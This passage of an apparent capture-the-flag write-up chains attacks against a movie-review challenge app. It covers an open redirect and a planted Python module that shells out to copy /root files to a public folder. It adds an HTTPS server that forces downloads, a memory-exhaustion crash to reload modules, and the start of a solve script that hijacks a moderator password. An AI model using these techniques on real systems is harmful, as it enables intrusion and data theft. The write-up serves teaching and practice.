<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span># impersonate.html
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>script<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">document</span>.addEventListener(<span style="color:#f1fa8c">&#39;DOMContentLoaded&#39;</span>, <span style="color:#8be9fd;font-style:italic">function</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">const</span> urlParams <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> URLSearchParams(<span style="color:#8be9fd;font-style:italic">window</span>.location.search);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">const</span> redirectTo <span style="color:#ff79c6">=</span> urlParams.get(<span style="color:#f1fa8c">&#39;redirect_to&#39;</span>) <span style="color:#ff79c6">?</span> <span style="color:#8be9fd;font-style:italic">decodeURIComponent</span>(urlParams.get(<span style="color:#f1fa8c">&#39;redirect_to&#39;</span>)) <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;/movies&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        setTimeout(() =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">window</span>.location.replace(redirectTo);
</span></span><span style="display:flex;"><span>        }, <span style="color:#bd93f9">2000</span>);
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>/script&gt;
</span></span></code></pre></div><p>Alright, so it seems that the frontend javascript times out for 2 seconds, then directs the user to the page in the <code>GET</code> parameter <code>redirect_to</code>. We can abuse this by setting any remote full URL into the parameter, to make an <code>open redirect</code>.</p>
<p>This means that if an admin visits the link <code>/admin/impersonate?username=moderator%40movie-review.local&amp;redirect_to=https://example.com/</code> they will be directed to <code>https://example.com</code> after two seconds.</p>
<p>We can abuse this functionality with the admin bot to send it out of bounds, but where should we send it and what should we serve it?</p>
<p>We know from the experimental features that the bot will download files to the root directory if served downloadable files. <strong>This is quite a vulnerability</strong> since if we make the bot download a malicious python module to the folder that <code>app.py</code> resides in, then due to the order in the <code>module search path</code> (<a href="https://docs.python.org/3/tutorial/modules.html#the-module-search-path">https://docs.python.org/3/tutorial/modules.html#the-module-search-path</a>) the malicious module will be preferred over the actual module.</p>
<p>In concrete terms what this means, is that since <code>app.py</code> imports <code>html.py</code> and uses the function <code>escape()</code> from the import, then if we manage to put a file <code>html.py</code> into the same directory as <code>app.py</code> is in, with a function definition for <code>escape()</code> then it will be used over the intended <code>html.py</code>.</p>
<p>So let´s create a malicious <code>html.py</code> that has a function <code>escape()</code> that reads every file in <code>/root/</code> out to a file <code>flagt.css</code> in the directory serving static files (<code>/app/static</code>)</p>
<p><code>html.py:</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># html.py (the evil one)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> subprocess
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">#Follow the exact way the function is used in app.py</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">escape</span>(a,quote<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;a&#34;</span>):
</span></span><span style="display:flex;"><span>  subprocess<span style="color:#ff79c6">.</span>run(<span style="color:#f1fa8c">&#34;cat /root/*.txt &gt; /app/static/flag.css&#34;</span>, shell<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
</span></span></code></pre></div><p>Now we have the payload, let&rsquo;s get it delivered. We need to host a web server with https that when prompted for this file will send it for download.</p>
<p>What makes the browser download a file instead of just showing it is the <code>Content-Disposition</code> header, so when a browser visits our server looking for <code>html.py</code> we need to return the header</p>
<pre><code>Content-Disposition: attachment; filename=&quot;html.py&quot;
</code></pre>
<p>We can create a web server that does this with the following python code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># httpsserver.py</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> http.server <span style="color:#ff79c6">import</span> HTTPServer, SimpleHTTPRequestHandler
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ssl
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> mimetypes
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> socket
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">StreamingHandler</span>(SimpleHTTPRequestHandler):
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">send_chunk</span>(self, chunk):
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span>:
</span></span><span style="display:flex;"><span>            self<span style="color:#ff79c6">.</span>wfile<span style="color:#ff79c6">.</span>write(chunk)
</span></span><span style="display:flex;"><span>            self<span style="color:#ff79c6">.</span>wfile<span style="color:#ff79c6">.</span>flush()
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">except</span> (ssl<span style="color:#ff79c6">.</span>SSLEOFError, ssl<span style="color:#ff79c6">.</span>SSLError, ConnectionResetError,
</span></span><span style="display:flex;"><span>                BrokenPipeError, socket<span style="color:#ff79c6">.</span>error):
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">do_GET</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>isfile(self<span style="color:#ff79c6">.</span>translate_path(self<span style="color:#ff79c6">.</span>path)) <span style="color:#ff79c6">and</span> <span style="color:#ff79c6">not</span> self<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>endswith(<span style="color:#f1fa8c">&#39;.html&#39;</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">try</span>:
</span></span><span style="display:flex;"><span>                self<span style="color:#ff79c6">.</span>send_response(<span style="color:#bd93f9">200</span>)
</span></span><span style="display:flex;"><span>                self<span style="color:#ff79c6">.</span>send_header(<span style="color:#f1fa8c">&#39;Content-Type&#39;</span>, mimetypes<span style="color:#ff79c6">.</span>guess_type(self<span style="color:#ff79c6">.</span>path)[<span style="color:#bd93f9">0</span>])
</span></span><span style="display:flex;"><span>                self<span style="color:#ff79c6">.</span>send_header(<span style="color:#f1fa8c">&#39;Content-Disposition&#39;</span>,
</span></span><span style="display:flex;"><span>                               <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;attachment; filename=&#34;</span><span style="color:#f1fa8c">{</span>os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>basename(self<span style="color:#ff79c6">.</span>path)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;&#39;</span>)
</span></span><span style="display:flex;"><span>                self<span style="color:#ff79c6">.</span>send_header(<span style="color:#f1fa8c">&#39;Content-Length&#39;</span>,
</span></span><span style="display:flex;"><span>                               <span style="color:#8be9fd;font-style:italic">str</span>(os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>getsize(self<span style="color:#ff79c6">.</span>translate_path(self<span style="color:#ff79c6">.</span>path))))
</span></span><span style="display:flex;"><span>                self<span style="color:#ff79c6">.</span>end_headers()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(self<span style="color:#ff79c6">.</span>translate_path(self<span style="color:#ff79c6">.</span>path), <span style="color:#f1fa8c">&#39;rb&#39;</span>) <span style="color:#ff79c6">as</span> f:
</span></span><span style="display:flex;"><span>                    self<span style="color:#ff79c6">.</span>copyfile(f, self<span style="color:#ff79c6">.</span>wfile)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">except</span> Exception <span style="color:#ff79c6">as</span> e:
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Error serving file: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">type</span>(e)<span style="color:#ff79c6">.</span>__name__<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">str</span>(e)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">super</span>()<span style="color:#ff79c6">.</span>do_GET()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">run_server</span>(port<span style="color:#ff79c6">=</span><span style="color:#bd93f9">443</span>, cert_file<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;cert.pem&#39;</span>, key_file<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;key.pem&#39;</span>):
</span></span><span style="display:flex;"><span>    server <span style="color:#ff79c6">=</span> HTTPServer((<span style="color:#f1fa8c">&#39;0.0.0.0&#39;</span>, port), StreamingHandler)
</span></span><span style="display:flex;"><span>    context <span style="color:#ff79c6">=</span> ssl<span style="color:#ff79c6">.</span>SSLContext(ssl<span style="color:#ff79c6">.</span>PROTOCOL_TLS_SERVER)
</span></span><span style="display:flex;"><span>    context<span style="color:#ff79c6">.</span>load_cert_chain(cert_file, key_file)
</span></span><span style="display:flex;"><span>    server<span style="color:#ff79c6">.</span>socket <span style="color:#ff79c6">=</span> context<span style="color:#ff79c6">.</span>wrap_socket(server<span style="color:#ff79c6">.</span>socket, server_side<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Server running on port </span><span style="color:#f1fa8c">{</span>port<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>    server<span style="color:#ff79c6">.</span>serve_forever()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">create_self_signed_certs</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>exists(<span style="color:#f1fa8c">&#39;cert.pem&#39;</span>) <span style="color:#ff79c6">or</span> <span style="color:#ff79c6">not</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>exists(<span style="color:#f1fa8c">&#39;key.pem&#39;</span>):
</span></span><span style="display:flex;"><span>        os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#39;openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj &#34;/CN=localhost&#34;&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Created self-signed certificates&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    create_self_signed_certs()
</span></span><span style="display:flex;"><span>    run_server(port<span style="color:#ff79c6">=</span><span style="color:#bd93f9">443</span>)
</span></span></code></pre></div><p>This HTTPS server creates a self signed certificate and accepts connections with TLS on only, additionally it serves every single file as a downloadable, except for <code>.html</code> files that will be displayed (Coming back to this).</p>
<p>So from here let us:</p>
<ol>
<li>Enable experimental features in the admin panel.</li>
<li>Create a malicious <code>html.py</code> to be downloaded by the bot.</li>
<li>Serve a <code>https web server</code> that will send <code>.py</code> files as downloadables.</li>
<li>Abuse the <code>open redirect</code> vulnerability in the impersonate functionality to send the bot to our server.</li>
<li>Make the bot download the malicious <code>html.py</code> to the root directory, next to <code>app.py</code></li>
</ol>
<p>See it in action below:</p>
<video autoplay loop muted playsinline controls>
  <source src="/download_html.webm" type="video/webm">
  Your browser does not support the video tag.
</video>
<h2 class="heading" id="step-5---crashing-flask-to-force-reload-modules-and-get-remote-code-execution">
  Step 5 - Crashing flask to force reload modules and get remote code execution
  <a class="anchor" href="#step-5---crashing-flask-to-force-reload-modules-and-get-remote-code-execution">#</a>
</h2>
<p>So the last step is to actually get the server to execute the malicious function in the malicious <code>html.py</code> module. The module is not used right out of the box since the modules are loaded in memory to start, and therefore the real functions will be used.</p>
<p>Flask has to restart to reload the modules, so our goal is to either make it crash or force it to restart 😈</p>
<p>For this we have to go back and revisit the <code>supervisord.conf</code> file, which has a very important line in it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span># supervisord.conf
</span></span><span style="display:flex;"><span>[supervisord]
</span></span><span style="display:flex;"><span>nodaemon=true
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[program:flaskapp]
</span></span><span style="display:flex;"><span>command=python app.py
</span></span><span style="display:flex;"><span>directory=/app
</span></span><span style="display:flex;"><span>autorestart=true
</span></span><span style="display:flex;"><span>stopasgroup=true
</span></span><span style="display:flex;"><span>killasgroup=true
</span></span><span style="display:flex;"><span>stdout_logfile=/var/log/supervisor/flask.log
</span></span><span style="display:flex;"><span>stderr_logfile=/var/log/supervisor/flask.err
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[program:varnishd]
</span></span><span style="display:flex;"><span>command=varnishd -F -a :80 -f /default.vcl -s malloc,256m
</span></span><span style="display:flex;"><span>autorestart=true
</span></span><span style="display:flex;"><span>stopasgroup=true
</span></span><span style="display:flex;"><span>killasgroup=true
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[eventlistener:memmon]
</span></span><span style="display:flex;"><span>command=memmon -c -a 250MB
</span></span><span style="display:flex;"><span>events=TICK_60
</span></span></code></pre></div><p>Namely that <code>superlance</code> is being used to monitor excessive memory usage and kill processes that exceed a set limit. This configuration file shows that any process managed by <code>supervisord</code> that exceed <em>250 mb</em>  of memory will get restarted, this is checked every 60 second (<code>memmon -c -a 250MB</code> and<code>TICK_60</code>).</p>
<p>So the goal is to make the server use more than 250 mb of memory so that it will be killed, restarted and the malicious module will be loaded.</p>
<p>If we go back to the <code>bot.py</code> file, we can spot this line of code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># bot.py</span>
</span></span><span style="display:flex;"><span>reported_reviews <span style="color:#ff79c6">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">#...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> experimental:
</span></span><span style="display:flex;"><span>    p_element <span style="color:#ff79c6">=</span> driver<span style="color:#ff79c6">.</span>find_elements(By<span style="color:#ff79c6">.</span>TAG_NAME, <span style="color:#f1fa8c">&#39;p&#39;</span>)
</span></span><span style="display:flex;"><span>    text <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> element <span style="color:#ff79c6">in</span> p_element:
</span></span><span style="display:flex;"><span>        text <span style="color:#ff79c6">+=</span> element<span style="color:#ff79c6">.</span>text
</span></span><span style="display:flex;"><span>        reported_reviews<span style="color:#ff79c6">.</span>append(element<span style="color:#ff79c6">.</span>text)
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># idk here do something with the text, maybe some llm stuff?</span>
</span></span></code></pre></div><p>So here is something funny, the bot when visiting a link will parse and look for all <code>&lt;p&gt;</code> tags and save their content to a global list, this global list can help us fill up the memory of the application.</p>
<p>If we reuse the <code>open redirect</code> vulnerability to force the bot to visit one of our own links again, but provide a <em>HUGE</em> <code>&lt;p&gt;</code> tag, we will make the flask service hog op memory, hopefully enough to make <code>superlance</code> come around and restart it.</p>
<p>We can create such an <code>index.html</code> file with the following python one-liner:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#39;index.html&#39;</span>, <span style="color:#f1fa8c">&#39;w&#39;</span>)<span style="color:#ff79c6">.</span>write(<span style="color:#f1fa8c">&#39;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;&#39;</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;x&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">1000</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">1000</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">50</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&#39;</span>)
</span></span></code></pre></div><p>This creates a <code>50 mb</code> <code>&lt;p&gt;</code> tag, it could be possible to create a larger, but the bot has a timeout of max 10 seconds of live time, and we want to make sure that the bot actually manages to download and parse the huge html document in time, since it is kept in memory we can just force to bot to visit many times, until memory is exceeded.</p>
<p>So let us send the bot to our huge <code>index.html</code> file and wait for the service to get restarted, afterwards we can just log in and go to the main page where the function <code>escape()</code> is used on the main page.</p>
<video autoplay loop muted playsinline controls>
  <source src="/crash.webm" type="video/webm">
  Your browser does not support the video tag.
</video>
<p>And we got the last flag! Challenge solved!</p>
<h2 class="heading" id="creating-a-solve-script">
  Creating a solve script
  <a class="anchor" href="#creating-a-solve-script">#</a>
</h2>
<p>I think its cool to have a full solve script, so I made that, you will need to have the <code>httpsserver.py</code>, <code>index.html</code> (with large <code>&lt;p&gt;</code> tag, <code>html.py</code> and <code>solve.py</code> in the same directory for it to work) here is <code>solve.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># solve.py</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> subprocess
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>my_ip <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;172.19.0.3&#34;</span>
</span></span><span style="display:flex;"><span>target_url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://172.19.0.2:80&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">### Create a user first</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[*] Creating a user&#34;</span>)
</span></span><span style="display:flex;"><span>register_url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>target_url<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/api/register&#34;</span>
</span></span><span style="display:flex;"><span>register_payload<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#34;password&#34;</span>: <span style="color:#f1fa8c">&#34;a&#34;</span>, <span style="color:#f1fa8c">&#34;signup_code&#34;</span>: <span style="color:#f1fa8c">&#34;aar~-000q-022&#34;</span>, <span style="color:#f1fa8c">&#34;username&#34;</span>: <span style="color:#f1fa8c">&#34;abc@xx.com&#34;</span>}
</span></span><span style="display:flex;"><span>r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(register_url, json<span style="color:#ff79c6">=</span>register_payload)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> r<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Failed to create user&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[+] User created&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">### login with this new user</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[*] Logging in&#34;</span>)
</span></span><span style="display:flex;"><span>user_session <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>session()
</span></span><span style="display:flex;"><span>login_url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>target_url<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/api/login&#34;</span>
</span></span><span style="display:flex;"><span>login_payload<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#34;password&#34;</span>: <span style="color:#f1fa8c">&#34;a&#34;</span>, <span style="color:#f1fa8c">&#34;username&#34;</span>: <span style="color:#f1fa8c">&#34;abc@xx.com&#34;</span>}
</span></span><span style="display:flex;"><span>response <span style="color:#ff79c6">=</span> user_session<span style="color:#ff79c6">.</span>post(login_url, json<span style="color:#ff79c6">=</span>login_payload)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Failed to login&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[+] Logged in&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">### Add a review for later</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[*] Adding a review&#34;</span>)
</span></span><span style="display:flex;"><span>add_review_url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>target_url<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/api/submit_review&#34;</span>
</span></span><span style="display:flex;"><span>add_review_payload <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;movie_id&#34;</span>:<span style="color:#f1fa8c">&#34;1&#34;</span>,<span style="color:#f1fa8c">&#34;review_title&#34;</span>:<span style="color:#f1fa8c">&#34;a&#34;</span>,<span style="color:#f1fa8c">&#34;review&#34;</span>:<span style="color:#f1fa8c">&#34;a&#34;</span>}
</span></span><span style="display:flex;"><span>response <span style="color:#ff79c6">=</span> user_session<span style="color:#ff79c6">.</span>post(add_review_url, json<span style="color:#ff79c6">=</span>add_review_payload)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Failed to add review&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[+] Review added&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">### Maliciously update password for moderator user</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[*] Updating password for moderator user, through own profile&#34;</span>)
</span></span><span style="display:flex;"><span>update_user_url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>target_url<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/api/update_user&#34;</span>
</span></span><span style="display:flex;"><span>update_user_payload <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;username&#34;</span>:<span style="color:#f1fa8c">&#34;moderator@movie-review.local</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,<span style="color:#f1fa8c">&#34;password&#34;</span>:<span style="color:#f1fa8c">&#34;a&#34;</span>}
</span></span><span style="display:flex;"><span>response <span style="color:#ff79c6">=</span> user_session<span style="color:#ff79c6">.</span>post(update_user_url, json<span style="color:#ff79c6">=</span>update_user_payload)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Failed to update password for moderator@movie-review.local&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[+] Password updated for moderator@movie-review.local to &#39;a&#39;&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">### Logging in as moderator</span>
</span></span><span style="display:flex;"><span>moderator_session <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>session()
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[*] Logging in as moderator&#34;</span>)
</span></span><span style="display:flex;"><span>login_payload<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#34;password&#34;</span>: <span style="color:#f1fa8c">&#34;a&#34;</span>, <span style="color:#f1fa8c">&#34;username&#34;</span>: <span style="color:#f1fa8c">&#34;moderator@movie-review.local&#34;</span>}
</span></span><span style="display:flex;"><span>response <span style="color:#ff79c6">=</span> moderator_session<span style="color:#ff79c6">.</span>post(login_url, json<span style="color:#ff79c6">=</span>login_payload)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Failed to login as moderator&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[+] Logged in as moderator&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">### Make the admin bot visit the cache link</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[*] Making the admin bot visit the cache link&#34;</span>)
</span></span><span style="display:flex;"><span>visit_link_url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>target_url<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/api/report_review&#34;</span>
